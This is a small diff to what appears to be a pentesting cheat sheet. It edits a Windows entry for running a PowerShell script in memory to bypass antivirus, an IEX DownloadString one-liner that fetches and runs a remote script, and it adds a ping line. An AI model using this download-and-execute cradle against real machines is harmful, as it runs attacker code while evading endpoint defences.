@@ -13,7 +13,8 @@ few scripts and useful commands
 # windows
 <p>run ps1 script in memory (bypass antivirus) :</p>
 <ul>
-<li>powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')</li>
+<li>powershell IEX (New-Object Net.WebClient).DownloadString('http://ip:85/test.ps1')</li>
+<li> c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping ip</li>
 </ul>
 
 # bruteforce
